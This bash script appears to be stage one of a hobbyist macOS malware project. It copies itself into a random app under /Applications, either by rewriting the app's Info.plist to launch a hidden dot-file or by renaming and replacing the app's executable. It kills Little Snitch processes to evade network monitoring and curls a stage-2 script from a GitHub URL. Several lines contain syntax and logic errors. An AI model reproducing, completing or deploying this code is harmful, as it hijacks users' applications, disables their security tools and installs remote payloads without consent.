#!/bin/bash
#This script is stage one of lol, limewire. I have no idea how many stages will exist in total
#
#
#Sites that I used or looked at, for future reference, if I ever look back and have no idea what I did or something like that
#Yes, I looked up a lot of stuff
#Some of the code that I used these sources for has been deleted
#
#https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html
#https://www.launchd.info/
#https://stackoverflow.com/questions/35623462/bash-select-random-string-from-list
#https://linuxconfig.org/how-to-use-arrays-in-bash-script
#https://stackoverflow.com/questions/34823263/how-to-pass-a-variable-to-the-mv-command-to-rename-a-file-text-with-spaces-and-t#34823319
#https://stackoverflow.com/questions/13210880/replace-one-substring-for-another-string-in-shell-script#13210909
#https://ryanstutorials.net/bash-scripting-tutorial/bash-if-statements.php
#https://stackoverflow.com/questions/4881930/remove-the-last-line-from-a-file-in-bash#4881990
#https://stackoverflow.com/questions/14765569/test-if-multiple-files-exist#25140535
#https://www.cyberciti.biz/faq/bash-while-loop/
#https://tecadmin.net/check-if-file-has-read-write-execute-permission-bash-script/
#https://stackoverflow.com/questions/59895/how-to-get-the-source-directory-of-a-bash-script-from-within-the-script-itself#59916
#https://www.cyberciti.biz/faq/unix-linux-bsd-appleosx-bash-assign-variable-command-output/
#https://www.cyberciti.biz/faq/how-to-use-sed-to-find-and-replace-text-in-files-in-linux-unix-shell/
#https://www.linuxquestions.org/questions/linux-newbie-8/randomly-select-a-folder-using-shell-scripting-886823/
#
#

#Variable for this script
CURDIR=$(pwd)
THISSCRIPT="${CURDIR}$0"

#We need a dir for hiding this/the/a script which everyone can read and write to/from (without SIP disabled 
#or sudo perms). The directory /Applications/ is a good fit for this. 
#There will be two types of applications/folders that will be present: ones that require sudo to modify, and
#ones that won't. I've come up with three ways to hide the/this/a script, each with upsides and downsides:
#[1] Changing the app's Info.plist to launch the script, which will be a . file in the MacOS dir of the app
#[2] Renaming the app's executable and copying the script to where the executable was
#[3] Just hiding the script as a hidden file somewhere in the app's dir
#For solution number one and two, the script will run the actual executable on the last line of the script.
#Solution number three won't be used for stage one, if at all.

#Duplication:
#
#This starts with checking if only one file is in the APPDIR. This should be improved upon to record what apps
#do not have exactly one file in the APPDIR, in order to prevent lost time. Remember, this is ran before the
#executable (in most cases), so the less time that this takes, the better.
#
#Initial variable for the loop
ISPLACED=NO
while [ "${ISPLACED}" == "NO"]; do
  #Application roulette (finally working!)
  loc=(/Applications/*)
  APPROOTDIR="${loc[RANDOM % ${#loc[@]}]}/"
  APPDIR="${APPROOTDIR}Contents/MacOS/"
  #(Number of) files (in the app's MacOS folder) check:
  if [ `ls -1 ${APPDIR}* 2>/dev/null | wc -l ` == 1 ]; then
    #Some variables for later:
    EXENAME=$(ls ${APPDIR})
    EXEPATH="${APPDIR}${EXENAME}"
    #Method choosing:
    #
    #Important note: I can't think of any reasons to not use method one in all cases, and that may be what
    #happens in the future. Because why not, and I suppose in the case that method one doesn't work/has issues
    #or downsides, I've included method two, which I suppose is easier. Again, I have no idea why (in general)
    #
    #The method chosen is dependent on whether the executable is protected or not. System applications and 
    #apps from the AppStore have protected executables, but most other apps don't. So, we need a way to figure 
    #out if the executable is protected or not.
    #I found this solution on TecAdmin, I think it'll work fine.
    METHOD=0
    if [ -w ${EXEPATH} ]; then
      #We can move the executable. Therefore, we use method two
      METHOD=2
    else
      #We can't move the executable. Therefore, we use method one
      METHOD=1
    fi
    #Duplication
    #For testing and other reasons (including 'why not?'), the duplication is in a seperate if statement.
    if [ ${METHOD} == 1 ]; then
    #Yes, I am aware that I keep switching number and type of brackets, ways that the variable is used, etc.
    #I'm honestly not sure if it matters in this situation (whether I use single or double square brackets).
    #I'm also honestly not sure whether I can use variables in the ways that I am; I guess I'll find out.
      #Method one: modifying the plist, and hiding the script
      cp "${THISSCRIPT}" "${APPDIR}.${EXENAME}"
      #Variable time: (I suppose that these could go before the cp line, but in the end it doesn't really
      #matter)
      SCRIPTNAME=".${EXENAME}"
      SCRIPTPATH="${APPDIR}${SCRIPTNAME}"
      #Info.plist manipulation:
      sed "s/${EXENAME}/${SCRIPTNAME}/g" "${APPROOTDIR}Contents/Info.plist"
    else
      #Method two: moving and replacing the target executable with this/the script
      #It should be mentioned that this method *could* break programs. I haven't decided what to do in the
      #case that that is the case, and I don't even know why I'm doing this (method) in the first place.
      mv "${EXEPATH}" "${EXEPATH}0"
      #I mean, what's the chance that an executable will have 0 as the last character in its name?
      cp "${THISSCRIPT}" "${EXEPATH}"
      #Variable time: (I don't know if this 'switcheroo' will work properly, but I don't see why it shouldn't)
      SCRIPTNAME="${EXENAME}"
      SCRIPTPATH="${EXEPATH}"
      EXENAME="${SCRIPTNAME}0"
      EXEPATH="${SCRIPTPATH}0"
    fi
    #Launching the actual executable
    #The last line of this script will be deleted and then replaced with the app's (actual) executable, to
    #prevent the wrong application from opening when the script is run, as that would not be good.
    #Aside from that, I can just use the EXENAME variable for this job.
    #This is supposed to delete the last line, but if it and/or the last two lines are blank, it deletes both.
    #I'll have to test the sed line.
    sed -i '' -e '$ d' "${SCRIPTPATH}"
    echo "./${EXENAME}" > "${SCRIPTPATH}"
    ISPLACED=YES
  else
    ISPLACED=NO
  fi
done

#Stage 2:
#
#I need to have some kind of start confition, maybe a timer or a use ammount?
#Network monitor check and download of Stage 2:
#The first part of this, the if statement and the variables, check for network monitoring applications
#The second part of this will download Stage 2 to the same directory as this script (change this)
NMCLS=/Applications/Little\ Snitch\ Configuration.app
NMCLU=/Applications/LuLu.app
NMCHO="/Applications/Hands Off!.app"
if [ -d "$NMCLU" ] || [ -d "$NMCHO" ]; then
elif [ -d "$NMCLS" ]; then
#I can't kill the Little Snitch Daemon, as that belongs to root, but I can kill the other LS processes.
#I'll have to check if LS still shows the alert when only the daemon is still alive.
#I should also 'port' this 'solution' to LuLu, Hands Off!, and the newest Little Snitch (if it's not the same).
  killall "Little Snitch Agent"
  killall "Little Snitch Configuration"
  killall "Little Snitch Network Monitor"
  curl https://raw.githubusercontent.com/The-SamminAter/lol-limewire/master/stage-2.sh > ./stage-2.sh
else
  curl https://raw.githubusercontent.com/The-SamminAter/lol-limewire/master/stage-2.sh > ./stage-2.sh
fi
#Running Stage 2:
#I can probably just hand it off by running ./stage-2.sh or something.

#LAST LINE
